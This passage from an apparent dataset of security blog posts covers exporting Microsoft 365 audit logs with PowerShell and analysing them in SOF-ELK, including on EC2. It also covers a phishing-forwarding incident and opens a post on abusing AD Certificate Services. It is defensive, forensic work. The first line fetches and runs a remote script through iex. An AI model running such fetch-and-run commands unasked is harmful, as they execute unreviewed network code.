PowerShell 7.x, and installing the EXO module:\n\n#download and install PowerShell 7.x.x - msi\niex \"& { $(irm https://aka.ms/install-powershell.ps1) } -UseMSI -Quiet\"\n#RUN FROM PowerShell v7 (pwsh) - install exchangeonline management and graph api...be patient...takes a few minutes and since using pwsh - no progress indicators\n& \"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -Command Install-Module -name exchangeonlinemanagement -repository psgallery -force\n& \"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -Command Install-Module -name microsoft.graph -scope allusers -repository psgallery -force\n\nInstall PowerShell 7 and the EXO Mgmt Module\n\nIf all goes well, you can launch PowerShell 7 from PowerShell 5 by typing \u201cpwsh\u201d and hitting enter! You may have to kill and restart your PowerShell 5 session for it to recognize that command. If you execute \u201cGet-InstalledModule -Name Exchange*\u201d, you should see ExchangeOnlineManagement 3.2.0, as below:\n\nGet-InstalledModule -Name Exchange*\n\nLaunch PowerShell 7 and confirm EXO Mgmt Module\n\nBecause the UAL can be voluminous, even in a small M365 tenant, it\u2019s wise to be judicious in our acquisition. Fortunately, at the outset of an audit/investigation, we usually have a target account or accounts and associated date range, which is where we\u2019ll start.\n\nFirst, we\u2019ll get connected by using the \u201cConnect-ExchangeOnline\u201d command from PowerShell 7. You should receive a modern-auth pop-up browser window, where you\u2019ll authenticate as per usual to M365 using an account with adequate permissions (review this) and MFA. You are using MFA, right? Right!? Of course you are, as it is not safe to wrangle without it!\n\nConnect via EXO and Authenticate\n\nOnce connected, we\u2019ll do a quick test to verify that all is well. Remember that tab-completion is your friend! Start typing \u201cSearch-Un\u201d and hit tab. If you don\u2019t get autocomplete for \u201cSearch-UnifiedAuditLog,\u201d then you are likely lacking required permissions (review this). To sample data access/output, let\u2019s run the command below, \u201cSearch-UnifiedAuditLog -StartDate 7/15/2023 -EndDate 7/20/2023 -UserIds target-user@yourdomain.com -ResultSize 1,\u201d changing the parts in italics as appropriate. You should see output similar to the image below. Note that there are a few discrete named fields and the AuditData JSON blob:\n\nSearch-UnifiedAuditLog -StartDate 7/15/2023 -EndDate 7/20/2023 -UserIds target-user@yourdomain.com -ResultSize 1\n\nSingle UAL Record Search\n\nUltimately, we want to pull all UAL data for our target user/s for a date range, often the entirety of available data (365 days), but we may also want to do some searching or filtering to guide or narrow our UAL exports. For example, we might want to search for a particular operation or extract a few key components of the AuditData for review. In our initial test search, we see an operation of \u201cRemove delegated permission grant\u201d from a highly suspicious character named \u201cPC,\u201d which might lead us to wonder about the associated addition of said permission grant. If we run \u201cSearch-UnifiedAuditLog -StartDate 1/1/2023 -EndDate 7/1/2023 -Operations \u201cAdd delegated permission grant\u201d -ResultSize 1\u201d, perhaps we can find out! Note the result size limit for brevity and that I did not specify a UserId. Adjust either as desired:\n\nSearch-UnifiedAuditLog -StartDate 1/1/2023 -EndDate 7/1/2023 -Operations \u201cAdd delegated permission grant\u201d -ResultSize 1\n\nUAL Operations Filter\n\nPerhaps \u201cPC\u201d should not have Microsoft Graph permissions, you notice the User Agent in the AuditData looks like Edge on Windows, which seems suspect/abnormal. Are there any other audited actions in your tenant using this User Agent? Let\u2019s try running \u201cSearch-UnifiedAuditLog -StartDate 1/1/2023 -EndDate 7/20/2023 -ResultSize 1 | Select-Object -ExpandProperty AuditData | ConvertFrom-Json | Where-Object ExtendedProperties -like \u201c*Mozilla*\u201d | Select-Object workload,userid,extendedproperties\u201d:\n\nSearch-UnifiedAuditLog -StartDate 1/1/2023 -EndDate 7/20/2023 -ResultSize 1 | Select-Object -ExpandProperty AuditData | ConvertFrom-Json | Where-Object ExtendedProperties -like \u201c*Mozilla*\u201d | Select-Object workload,userid,extendedproperties\n\nUAL Filtering by User Agent \u201cKeyword\u201d\n\nThe good news is that that worked! The bad news is that it\u2019s cumbersome and not scalable, which leads us to the UAL parsing and querying challenges. You can export to CSV, but the AuditData translates to a single field. You can use Excel and convert from JSON, which is simple, expedient, and moderately useful, but you\u2019ll still end up with truncated list entries and encounter scaling constraints on large datasets. What to do? Drum roll please\u2026 enter\u2026 SOF-ELK. (Thank you, Phil Hagen and team!)\n\nSecurity Operations and Forensics Elasticsearch, Logstash, Kibana (SOF-ELK) is a \u201cbig data analytics platform focused on the typical needs of computer forensic investigators/analysts,\u201d available in a prepacked Virtual Machine. For our purposes, SOF-ELK has built-in, well-maintained parsers for wrangling UAL logs! You can read more here: sof-elk/VM_README.md at main \u00b7 philhagen/sof-elk \u00b7 GitHub or head directly here to download a VM: https://for572.com/sof-elk-vm\n\nUAL Parse and Query Solution\n\nOnce you\u2019ve downloaded and unzipped the VM, you can launch it via VMWare Workstation/Fusion/Player. See the README.md link above for general info, including username/password. I\u2019ll be using SOF-ELK from an EC2 instance. Export of VM to an EC2 AMI is a bit of a process, which I\u2019ll write up in part two of this post. I\u2019ll go ahead and ssh from my Windows Server 2022 EC2 instance to SOF-ELK in anticipation of next steps:\n\nSSH from Windows EC2 Instance to SOF-ELK\n\nNext, we\u2019ll return to our PowerShell session to extract data for use with SOF-ELK. If we are pulling a small amount of data, less than 5K results, we can run a singular command, as follows: \u201cSearch-UnifiedAuditLog -StartDate 7/20/2022 -EndDate 7/20/2023 -UserIds target-user@yourcompany.com -ResultSize 5000 | Select-Object -ExpandProperty AuditData | Out-File -Encoding UTF8 ual-target-user-07202022-07202023.json\u201d\n\nSearch-UnifiedAuditLog -StartDate 7/20/2022 -EndDate 7/20/2023 -UserIds target-user@yourcompany.com -ResultSize 5000 | Select-Object -ExpandProperty AuditData | Out-File -Encoding UTF8 ual-target-user-07202022-07202023.json\n\nUAL Export to JSON for \u201cPC\u201d User\n\nHow do we know if there are less than 5K UAL entries based on our query parameters? We don\u2019t! You can check by re-running the above command, replacing the output to file with measure: \u201cSearch-UnifiedAuditLog -StartDate 7/20/2022 -EndDate 7/20/2023 -UserIds pc@securecake.com -ResultSize 5000 | Select-Object -ExpandProperty AuditData | Measure\u201d\n\nAlternatively, we can use a couple different approaches to overcome the 5K record limit. See the link below for Microsoft\u2019s perspective. Naturally, I like my script better, mostly because it\u2019s simple and works for about 98% of my use cases. Just edit the file output path, the start and end dates, filter on specific UserIDs or just leave $null to search all. The script queries the UAL in one-hour increments to minimize the possibility of hitting the 5K max-results per query, reports count on-screen, and writes to a single file:\n\n#Change path to desired output location and change name to reflect date range\n$OutputFile = \".\\ual-userid-pc-07012023-07202023.json\"\n#Enter \"UserID\" in quotes or leave as $null for all Users\n$userids = $null\n#Enter start search date in format mm-dd-yyyy\n$StartSearchDate = get-date \"7-1-2023\u201d\n#Enter start search date in format mm-dd-yyyy\n$EndSearchDate = get-date \"7-20-2023\"\n$FormattedStartDate = Get-Date $EndSearchDate\n$DaysToSearch = (new-timespan -start $StartSearchDate -End $EndSearchDate).days\nFor ($i=0; $i -le $DaysToSearch; $i++){\n For ($j=23; $j -ge 0; $j--){\n $StartDate = ($EndSearchDate.AddDays(-$i)).AddHours($j)\n $EndDate = ($EndSearchDate.AddDays(-$i)).AddHours($j + 1)\n $Audit = Search-UnifiedAuditLog -StartDate $StartDate -EndDate $EndDate -userIDs $userids -ResultSize 5000\n$ConvertAudit = $Audit | select-object -expandproperty AuditData | out-file -encoding UTF8 $OutputFile -Append\nWrite-Host $StartDate `t $Audit.Count\n }\n} \n\nUAL Export Script\n\nUse a PowerShell script to search the audit log - Microsoft Purview (compliance) | Microsoft Learn\n\nMy script assumes that you are already connected via EXO to your tenant and works in reverse order, newest date/time to oldest, displaying record count per interval:\n\nExport Script Output\n\nNow we just need to copy our JSON data to SOF-ELK, be patient while ingestion and parsing occur, then move on to query wrangling via the SOF-ELK web UI! From my current directory, I\u2019ll confirm JSON file/s, and then \u201cscp\u201d them to the proper SOF-ELK directory:\n\nCopy UAL Data to SOF-ELK\n\nFrom our SOF-ELK ssh session, we can keep an eye on Elasticsearch progress by running \u201csof-elk_clear.py -i list\u201d, which will show us current indices. You may see no entries at first but be patient! In a couple minutes, you should see a \u201c- microsoft365 (nn documents)\u201d entry, which is a great sign that our data is being ingested/parsed:\n\nChecking SOF-ELK Indices\n\nAgain, a little patience is in order, but we can go to the web UI and see what our results look like. Launch a browser and visit http://x.x.x.x:5601 (replacing the x\u2019s with your SOF-ELK IP address). This should bring you to the default dashboard. Click the \u201chamburger\u201d icon (three lines in the upper-left corner) and click \u201cDiscover.\u201d\n\nSOF-ELK Discover\n\nChange your data view from \u201clogstash-*\u201d to \u201cmicrosoft365-*\u201d:\n\nMicrosoft365 Data View\n\nThen change your date range to an applicable value. I\u2019ll use \u201cQuick Select\u201d and \u201cLast One Month\u201d for my \u201cPC UAL\u201d dataset:\n\nSet Date/Time Range\n\nYou should now see some \u201chits\u201d and a couple hundred \u201cavailable fields.\u201d If not, make sure you\u2019ve selected the correct data view (microsoft365-*) and double-check your date-range filter:\n\nDate-Filtered Microsoft365 Data View\n\nThanks to the built-in parsing and some field normalization, we can now easily wrangle our data by viewing, selecting, and searching available fields. Let\u2019s sleuth out the \u201cPC\u201d user_name (if you filtered your UAL query on a specific UserID, this may not be necessary), and visualize some key UAL details: workload, operation, ips, and useragent. Type the first field name into the search box, e.g. \u201cuser_\u201d. Click the field name to see the \u201ctop\u201d values and confirm it is the data field you are looking for, then click the \u201c+\u201d sign at the top of the flyout to add the field as a column or click the \u201c+\u201d sign next to a top value to filter on that value. Repeat for each desired data field:\n\nAdd Fields to Current View\n\nNow we can easily pick and choose, filter, search and view the extracted AuditData fields:\n\nData View Table\n\nAs per our previous inline-filtering discussion, if we want to pivot on \u201cUserAgent\u201d and see if anyone else in our current UAL is using a suspect entry, just hover over a useragent column entry and select the \u201c+\u201d sign to \u201cfilter for this useragent.\u201d If you previously filtered on a single user_name, remove that filter (click the \u201cx\u201d to the right of the filter entry just below the manual filter box):\n\nFiltering on a Selected Data Field Value\n\nAnd thus begins the iterative process of querying your data to answer your audit/investigative questions, adding fields, filtering in/out field values, sorting, and visualizing. At some point, you\u2019ll likely want to export to CSV, which can be accomplished via the \u201cShare\u201d menu option and \u201cCSV Reports,\u201d and \u201cGenerate CSV\u201d:\n\nExport to CSV\n\nHopefully this is just the beginning of our SOF-ELK and UAL wrangling adventures, as we\u2019ve barely scratched the surface of SOF-ELK\u2019s utility! We\u2019ll circle back and discuss how to spin this whole mess up in AWS EC2 and how to convert UAL CSV files for SOF-ELK ingestion. Stay tuned and thanks for reading!\n\nPS: Just in case you were wondering, \u201chow many times can he use the word \u2018wrangle\u2019 in a single blog post?\u201d It was only ten times. I know it seemed like more than that, but it wasn\u2019t.\n\nREAD: \n\nPART 2\n\nPART 3\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Wrangling the M365 UAL with SOF-ELK on EC2 (Part 2 of 3)\"\nTaxonomies: \"How-To, Informational, InfoSec 201, Patterson Cake, Phishing, BEC, Business Email Compromise, EC2, Exchange Online Management, M365, Microsoft 365, SOF-ELK, UAL, Unified Audit Log\"\nCreation Date: \"Thu, 24 Aug 2023 16:36:57 +0000\"\nPatterson Cake //\n\nIn PART 1 of \u201cWrangling the M365 UAL,\u201d we talked about the value of the Unified Audit Log (UAL), some of the challenges associated with acquisition, parsing, and querying of the UAL data, and strategies for overcoming those challenges using PowerShell and SOF-ELK, focusing on how to properly format our exported data for easy ingestion into SOF-ELK, running as a locally-installed virtual machine. In this post, we\u2019ll look at spinning up SOF-ELK on EC2 to give us greater portability, flexibility, and extensibility for UAL wrangling! \n\nFor quick and easy SOF-ELK deployment, it\u2019s hard to beat downloading the pre-packaged virtual machine and running it locally via VMWare. But for those times when you need a little extra computing capacity or to collaborate with others on an investigation or to take advantage of ease of access to data or systems that are already cloud-based, deploying SOF-ELK on EC2 is worth the additional effort.\n\nWe\u2019ll start the process just like we did with our local VM deployment by downloading and unzipping the VM. The next step is to create an OVA from the extracted VM. If you have VMWare Workstation or Fusion, you can launch VMWare, import the VM, select it, then go to \u201cFile\u201d and \u201cExport to OVF:\u201d\n\nVMWare Workstation \u2013 Export to OVF\n\nYou\u2019ll then be prompted to specify where you want to save your export and what to name it. \n\nIMPORTANT: Make sure you specify a file extension of \u201c.ova\u201d when entering the file name, e.g. \u201csof-elk-20230623.ova.\u201d\n\nAlternatively, you can use the command-line \u201cOVF Tool,\u201d which is included with VMWare Workstation, Fusion, and Player. Just open a terminal and navigate to the \u201cOVFTool\u201d directory under your VMWare installation directory. From there, invoke the ovftool executable, providing the path to your source VMX file and a path for the export, remembering to give the file name an \u201c.ova\u201d extension:\n\nVMWare Workstation \u201covftool\u201d \u2013 Export to OVA\n\nNext, we\u2019ll need to prepare for upload of our exported \u201cova\u201d to S3 and conversion to an Amazon Machine Image (AMI). We\u2019ll create an S3 bucket, a \u201ccontainers.json\u201d file to describe our import, create an Identity and Access Management (IAM) role and policy for the import, and use the AWS CLI to import our image. Don\u2019t panic\u2026 we\u2019ll walk through it step-by-step!\n\nYou can accomplish most of the necessary AWS steps in either the web UI or via the CLI but, unless you are using \u201cMigration Hub Orchestrator,\u201d you\u2019ll need the CLI for the \u201cimport-image\u201d task. So, let\u2019s start with installation and setup of the CLI, detailed in the Amazon guides below:\n\nInstall or update the latest version of the AWS CLI - AWS Command Line Interface (amazon.com)\n\nSet up the AWS CLI - AWS Command Line Interface (amazon.com)\n\nOnce the AWS CLI is installed and configured, we\u2019ll make an S3 bucket for our upload, paying careful attention to make the bucket region match the region where we want to perform the image import:\n\naws s3 mb s3://your-unique-import-bucket-name --region us-east-1\n\nCreate an S3 Bucket for Upload of OVA\n\nNext, we\u2019ll setup the service role (\u201cvmimport\u201d) and policy required to allow the VM import/export. You can accomplish this via the web UI or via CLI. Before proceeding, it\u2019s worthwhile to check the \u201crequired permissions for VM import/export\u201d at the top of the linked page below, to make sure you have adequate privileges to complete these tasks!\n\nRequired permissions for VM Import/Export - VM Import/Export (amazon.com)\n\nSince the web UI is more intuitive and provides a bit of syntax-error checking, I\u2019ll head to https://console.aws.amazon.com/iamv2 and select \u201cPolicies, Create Policy,\u201d and click \u201cJSON.\u201d In the \u201cPolicy editor,\u201d you can copy/paste and replace default text to create a new, \u201cvmimport\u201d policy. \n\nIMPORTANT: Change the \u201cyour-unique-bucket-name\u201d entries (x2) to match your S3 \u201cimage import\u201d bucket:\n\n{\n \"Version\":\"2012-10-17\",\n \"Statement\":[\n {\n \"Effect\": \"Allow\",\n \"Action\": [\n \"s3:GetBucketLocation\",\n \"s3:GetObject\",\n \"s3:ListBucket\" \n ],\n \"Resource\": [\n \"arn:aws:s3:::your-unique-import-bucket-name\",\n \"arn:aws:s3:::your-unique-import-bucket-name/*\"\n ]\n },\n {\n \"Effect\": \"Allow\",\n \"Action\": [\n \"ec2:ModifySnapshotAttribute\",\n \"ec2:CopySnapshot\",\n \"ec2:RegisterImage\",\n \"ec2:Describe*\"\n ],\n \"Resource\": \"*\"\n }\n ]\n}\n\nNOTE: If you reference the AWS link above, you may notice that their recommended policy is for \u201cVM Import/Export.\u201d I omitted the \u201cexport\u201d bucket configuration for the context of this post.\n\nAfter you are happy with your JSON policy entries, click \u201cNext\u201d and provide a descriptive policy name, e.g. \u201cVM_Import_Policy,\u201d add a description if desired, add \u201cTags\u201d to help identify this resource in the future, and click \u201cCreate policy.\u201d\n\nNow that we have our policy ready, let\u2019s create a role. From the IAM web UI, click \u201cRoles,\u201d then \u201cCreate role,\u201d then \u201cCustom trust policy,\u201d and replace the default policy text with the JSON below:\n\n{\n \"Version\": \"2012-10-17\",\n \"Statement\": [\n {\n \"Effect\": \"Allow\",\n \"Principal\": { \"Service\": \"vmie.amazonaws.com\" },\n \"Action\": \"sts:AssumeRole\",\n \"Condition\": {\n \"StringEquals\":{\n \"sts:Externalid\": \"vmimport\"\n }\n }\n }\n ]\n}\n\nOn the \u201cAdd permissions\u201d screen, find and select your \u201cVM_Import_Policy.\u201d Click \u201cNext,\u201d provide a \u201cRole name,\u201d and add a description and tags if desired. Finally, click \u201cCreate role.\u201d\n\nOur S3 bucket is in place, our role with associated policy is ready to go, and now we can return to the AWS CLI to upload our OVA:\n\naws s3 cp C:\\VMs\\sof-elk-20230623.ova s3://your-unique-import-bucket-name/ --region us-east-1\n\nUpload OVA to S3 via AWS CLI\n\nWhile that upload is chugging away, we can get our \u201ccontainers.json\u201d file ready. Launch any text editor of your choosing, copy/paste the text below, editing the \u201cDescription\u201d for your OVA and the \u201cURL\u201d to match your upload bucket and desired OVA name. Then save the file as \u201ccontainers.json:\u201d\n\n[\n {\n \"Description\": \"SOF-ELK 20230623 OVA\",\n \"Format\": \"ova\",\n \"Url\": \"s3://your-unique-import-bucket-name/sof-elk-20230623.ova\"\n }\n]\n\nOnce your OVA upload is complete, we can initiate the \u201cimage import\u201d via the AWS CLI:\n\naws ec2 import-image --description \u201cSOF-ELK 20230623 OVA\u201d --disk-containers file://C:\\VMs\\containers.json\n\n If all goes well, you should see output similar to the image below, with a \u201cStatus\u201d of active and \u201cStatusMessage\u201d of pending: \n\nPay attention to the \u201cImportTaskId\u201d in your output, as we can use that to check the status of our image import:\n\naws ec2 describe-import-image-tasks \u2013import-task-ids import-ami-02d6da26f8b862f5a\n\n\u201cStatusMessage\u201d should now show \u201cconverting.\u201d Hit the up arrow in your CLI again to repeat the command and keep an eye on progress. Be patient as it takes a while, and the \u201cProgress\u201d indicator feels a little like \u201czero seconds remaining\u201d for about 30 minutes! Hang in there, we\u2019re almost done.\n\nOnce the import-image task is complete (\u201cStatus\u201d = completed), make note of the \u201cImageId,\u201d and we\u2019ll head to the EC2 web UI: https://us-east-1.console.aws.amazon.com/ec2 (note that I am targeting the us-east-1 region for this example). Unfortunately, the AMI receives a randomly generated name based on the aforementioned \u201cImageId.\u201d So let\u2019s go to \u201cImages\\AMIs,\u201d then find the AMI ID from your task-status output, select it, then click \u201cTags\\Manage Tags,\u201d and add a \u201cName\u201d and descriptive value, e.g. \u201cSOF-ELK 20230623.\u201d With the AMI selected, we can just click the \u201cLaunch instance from AMI\u201d button on the top menu to enter the launch wizard.\n\nWe\u2019re on the home stretch, and I\u2019ve only used the word \u201cwrangling\u201d twice! Within the \u201claunch an instance\u201d wizard, give your instance a \u201cName,\u201d select from the available instance types (I went with t3.medium), create or select an existing key pair, tweak network settings as desired, and create a new security group or use an existing group.\n\nIMPORTANT: Our image is based on a default SOF-ELK VM, which means well-known, default credentials! Please do not open up SSH to the world in your Security Group (SG)! My intent is almost always to access SOF-ELK from another EC2 instance, so I usually make a self-referencing SG and add the SOF-ELK instance and any other instances requiring access, not allowing any external access directly to SOF-ELK.\n\nFrom the EC2 web UI, go to \u201cSecurity Groups, Create security group,\u201d name it something descriptive, e.g. \u201cSOF-ELK Security Group,\u201d add a description and any desired tags, then click \u201cCreate security group.\u201d Select the new SG, click \u201cEdit inbound rules, Add rule,\u201d set type to \u201cAll TCP\u201d (you can be more restrictive if desired and just allow TCP ports 22 and 5601), set \u201cSource\u201d to \u201cCustom,\u201d then add the Security Group to itself and \u201cSave.\u201d Next, assign the SG to your SOF-ELK instance and any other instances that need to access to SOF-ELK.\n\nOnce you are satisfied with your Security Group select, click \u201cLaunch instance.\u201d While the instance is initializing, I\u2019ll make note of the private IP, then access my EC2 analysis server in anticipation of accessing SOF-ELK from there:\n\nSSH from an EC2 Instance to SOF-ELK\n\nFor one final check, let\u2019s launch a browser and navigate to the SOF-ELK URL, http://you-sof-elk-local-ip:5601:\n\nThe SOF-ELK web UI: It\u2019s alive!\n\nYou are now officially ready to wrangle the M365 UAL using SOF-ELK with all the flexibility, accessibility, and scale of EC2! Refer to \u201cpart 1\u201d for a refresher on how to export your data via PowerShell and query for your audit/investigative purposes. In the next and final part of this series, we\u2019ll talk about what to do when you are faced with UAL export data in CSV, which is not properly formatted for SOF-ELK ingestion. Stay tuned and thanks for reading!\n\nREAD:\n\nPART 1\n\nPART 3\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Wrangling the M365 UAL with SOF-ELK and CSV Data (Part 3 of 3)\"\nTaxonomies: \"How-To, Incident Response, Informational, InfoSec 201, Patterson Cake, Phishing, csv data, M365, Microsoft 365, SOF-ELK, UAL, Unified Audit Log\"\nCreation Date: \"Thu, 07 Sep 2023 16:04:25 +0000\"\nPatterson Cake //\n\nPART 1\n\nPART 2\n\nIn part one of \u201cWrangling the M365 UAL,\u201d we talked about acquiring, parsing, and querying UAL data using PowerShell and SOF-ELK. In part two, we discussed leveraging AWS EC2 for greater flexibility and accessibility for SOF-ELK deployment. Along the way, we learned how to specifically format our exported UAL data for easy, automated ingestion into SOF-ELK, but what if the data you\u2019ve acquired or were provided is not in the proper format? Fortunately, if we have the \u201cAuditData\u201d blob, as part of a CSV export from Purview or PowerShell, we can extract, reformat, and feed it to SOF-ELK for automatic parsing.\n\nWe are frequently called to investigate an incident that occurred days, weeks, even months prior and, in many cases, the customer or a third party pulled the UAL data from the M365 Purview (aka Compliance) Portal and provides it for our analysis. Unfortunately, the only export option from Purview is CSV and wrangling the data elements in the CSV via Excel or command-line parsing tools can be extremely onerous. Armed with the information from Wrangling... Part One about the data format SOF-ELK expects, we can take the provided CSV, pull out the \u201cAuditData\u201d blob, change the encoding, and we\u2019re back to efficient parsing and querying via SOF-ELK.\n\nThe first thing we need to do is extract the \u201cAuditData\u201d column from our CSV. If you have Excel handy, you can just open the CSV, copy/paste the \u201cAuditData\u201d column (do not include the column title) into a text editor and save it as a text file. Sometimes CSVs can be large and unwieldy, or you may not have Excel, in which case we can turn to \u201ccsvtool\u201d to extract the \u201cAuditData\u201d column via command line on Linux.\n\nNOTE: Although our CSV is \u201ccomma separated,\u201d the \u201cAuditData\u201d column contains commas, which makes \u201ccutting\u201d on comma delimiter challenging. \u201cCsvtool\u201d handles this nicely.\n\nI\u2019m using WSL (Debian), installing \u201ccsvtool\u201d via \u201csudo apt-get install csvtool\u201d:\n\n$sudo apt-get install csvtool\n\nLet\u2019s test our csvtool command just to validate our CSV column is correct, as sometimes, depending on how the UAL data was exported, the \u201cAuditData\u201d column number may vary. We\u2019re hoping to see the \u201cAuditData\u201d blob in its entirety:\n\n$csvtool col 6 your-csv-ual-data.csv | head -n 2\n\nChecking csvtool \u201cAuditData\u201d output\n\nColumn 6 looks correct, so we\u2019ll go ahead and extract all of column 6 to a text file, this time omitting the \u201cAuditData\u201d column heading. In the test above, you may have noticed the standard CSV double-quotes around values containing spaces. We\u2019ll need to remove these to create our SOF-ELK ingestible JSON file, and remove the \u201cAuditData\u201d column heading:\n\n$csvtool col 6 pc-purview-export.csv -o pc-purview-audit-data.csv\n$csvtool readable pc-purview-audit-data.csv | sed \u20181d\u2019 pc-purview-audit-data.json\n\nNow we just need to copy the file to our SOF-ELK ingestion directory (changing the IP to match your SOF-ELK system):\n\n$scp pc-purview-audit-data.json elk_user@192.168.1.100:/logstash/microsoft365/pc-purview-audit-data.json\n\nIf everything goes according to plan, you should be able to check to see if your M365 indices show up in Elasticsearch within SOF-ELK. You can do this via SSH and command line or check the web UI:\n\n$sof-elk_clear.py -i list\n\nChecking SOF-ELK Indices\n\nChecking SOF-ELK web UI\n\nWhat now? You guessed it: UAL wrangling time! Go back to part one for some pointers or stick around for a couple additional SOF-ELK tidbits!\n\nWhile I\u2019ve got your attention, I just wanted to point out two quick items of note relative to SOF-ELK: geolocation and updates. Neither is complicated and both are useful.\n\nThere is MaxMind geolocation data prepopulated in the current version of SOF-ELK, but it is necessarily stale, not useless but not up to date. To remedy this, visit MaxMind and sign-up for a GeoLite2 account (or one of their other commercial solutions): https://www.maxmind.com/en/geolite2/signup. Once you\u2019ve done that, you\u2019ll receive an account ID and can then generate a license key: https://www.maxmind.com/en/accounts/current/license-key.  To easily apply this to your SOF-ELK deployment and update the geolocation data, just run the built-in \u201cgeoip_bootstrap.sh\u201d script and enter your account info at the prompts. You\u2019ll need to run this as root.\n\n$sudo su\n#/usr/local/sbin/geoip_bootstrap.sh\n\nSetting up MaxMind SOF-ELK Configuration\n\nLastly, to keep your SOF-ELK installation up to date, you can run the built-in \u201csof-elk_update.sh\u201d script, which must also be run as \u201croot.\u201d\n\nAs previously mentioned, we\u2019ve only scratched the surface on SOF-ELK\u2019s utility! When you get a moment, do an \u201cls /logstash\u201d from your SOF-ELK system and ponder the log-wrangling possibilities (aws, azure, gcp, etc.)! \n\nViewing SOF-ELK\u2019s Ingestion Possibilities\n\nUntil next time, thank you very much for reading!\n\nREAD:\n\nPART 1\n\nPART 2\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Stop Phishing Yourself: How Auto-Forwarding and Exchange Contacts Can Stab You in the Back\"\nTaxonomies: \"Blue Team, Hayden Covington, Hunt Teaming, Informational, Phishing\"\nCreation Date: \"Thu, 21 Sep 2023 16:39:35 +0000\"\nHayden Covington //\n\nPhishing is an ever-present threat, but lately, user education and spam filters have helped mitigate some of that threat. But what happens when a phish makes it further than the user\u2019s mailbox and deeper into your own environment? Can users be expected to have the same level of caution?\n\nThe event covered in this post is a real event that I discovered while hunting through O365 logs for our SOC customers. For the sake of clarity throughout this blog post, I\u2019m going to refer to Microsoft 365 as O365, since that is how our log fields are currently labeled. I will also be redacting the email domains, so I\u2019ll refer to the customer domain as \u201ccustomer.com\u201d when necessary.\n\nWhen I first discovered this event, I was looking for emails that O365 had marked as phishing but still delivered (rather than blocked or quarantined). There could be a few reasons for this occurring, like a retroactive phishing verdict or an exception for certain mailboxes.\n\no365.audit.Verdict: \"Phish\" and o365.audit.DeliveryAction: Delivered\n\nWhat I found was quite a lot of spam emails that were related to marketing. O365 was marking tens of thousands of emails as phishing simply due to spoofed sender addresses by email marketing services. This is fairly common as you want your recipients to see your own email domain as the sender rather than the domain of the service you\u2019re using to send these emails.\n\nTo narrow the results down further, I began experimenting with excluding various field values to narrow down my search results. I\u2019ll spare you the details of my trial-and-error because that is when I found the events that inspired this blog post. Take a look at the screencap of the logs below:\n\nA few important things from that image to take note of:\n\nThe P1Sender field is a marketing email service domain\n\nThe P2Sender field is actually the customer\u2019s address of accounting@customer.com\n\nThe emails are all marked as phishing and have been blocked and quarantined\n\nThe O365 policy states that these emails are an \u201cIntraOrgPhish\u201d\n\nTo quickly explain the difference between P1Sender and P2Sender, the P1Sender is the \u201cMAIL FROM\u201d address which, in simple terms, can usually be understood as the true sender of the email. The P2Sender is the \u201cFrom\u201d address which is displayed in your email client as who the email is from. In this example, the accounting email address of the customer is being spoofed as the From address. This is also likely the reason for the marking of \u201cIntraOrgPhish.\u201d\n\nNow, hopefully having understood that, we shouldn\u2019t be terribly worried. All these emails were blocked and quarantined. Looking at the sender addresses, it doesn\u2019t look like a true intra-organizational phishing attack, so all seems fine. Later on, we can pull the emails if we want some artifacts, but otherwise, there\u2019s nothing requiring much of a response here, given how commonplace phishing emails like this are.\n\nHowever. Due to my morbid curiosity, I dug a little deeper and found this:\n\nA number of these emails were sent to an Atlassian email linked to a Jira project, and these emails were not blocked or quarantined even though they were classified as phishing. Rather, they were marked as outbound spam. But what is the difference here? I\u2019ll give you a hint \u2014 it\u2019s not either of the sender addresses. The P1Sender stays as the same email marketing domain and the P2Sender is still accounting@company.com. So why the different response from O365?\n\nIt turns out, this accounting email address is, unsurprisingly, an email distribution list for the company in question, and this email distro has a member that is an \u201cExchange Contact\u201d for forwarding and creating issues in Jira. This Exchange Contact facilitated the forwarding of these phishing emails to Jira, and with the emails now being outbound rather than inbound, O365 classified these as outbound spam and allowed them through.\n\nThis is where things get concerning. These emails were forwarded, malicious attachments and all, to a Jira project, creating Jira issues with those attachments included and attached within Jira. If you don\u2019t quite grasp the weight of this issue immediately, consider this: a user might be hesitant to open an attachment in a random email, but would they be just as hesitant to open an attachment in a Jira ticket assigned to them?\n\nLuckily, we caught this issue quickly, that same day. We were able to have these Jira tickets deleted from the project and created an Elastic detection to alert us of phishing attachments being forwarded to Atlassian. But most importantly, we didn\u2019t find any log events to indicate anyone opened that attachment or visited any of the links within.\n\nTo summarize the message of this blog post, I recommend that you carefully review and understand how you forward emails to your ticketing systems \u2014 you could very well be phishing your own users. As I mentioned earlier, even someone who is well-educated on the threats of phishing may not expect that phish to be sitting inside of one of their work items.\n\nWhat can you do about this (besides deleting Jira and returning to sticky notes and carrier pigeons for project management)?\n\nOn our side, a member of the BHIS systems team created a service account for one of our own email distros and connected it to our ticketing system. This allows for emails to be pulled from the inboxes, rather than being forwarded to a contact, which seemed to be the root cause of this issue.\n\nIf you\u2019re looking for how to do this for Jira, you might find this link helpful: https://support.atlassian.com/jira-service-management-cloud/docs/add-an-email-account/\n\nAs a bonus, if you\u2019ve read this far, here is part of what was in the malicious .html file:\n\nAs you might have already guessed, the file was a fake login page designed to be a credential harvester. While a cred harvester still might not have tricked a user within Jira, can we say the same if this was a macro-enabled excel workbook? I would prefer not to tempt that fate.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Abusing Active Directory Certificate Services - Part One\"\nTaxonomies: \"Alyssa Snow, Blue Team, External/Internal, How-To, Informational, Red Team, Red Team Tools, Active Directory, exploit\"\nCreation Date: \"Thu, 05 Oct 2023 16:00:00 +0000\"\n\n| Alyssa Snow\n\nActive Directory Certificate Services (ADCS)1 is used for public key infrastructure in an Active Directory environment. ADCS is widely used in enterprise Active Directory environments for managing certificates for systems, users, applications, and more.\n\nIn 2021, SpecterOps published a white paper that described ADCS in-depth along with ADCS misconfigurations and vulnerabilities2 that can be abused for credential theft, domain escalation, and persistence. This white paper took a deep dive into attack techniques for ADCS and provided guidance on how to prevent, detect, and respond to such attacks.\n\nThis blog post will not cover all techniques discussed in the white paper. I highly recommend reviewing both the white paper and the shortened blog post written by Will Schroeder and Lee Christensen. A link to the white paper3 and SpecterOps blog post4 can be found in the resources listed at the end of this post.\n\nTools\n\nSince the white paper came out, several tools have been published to help identify vulnerabilities and 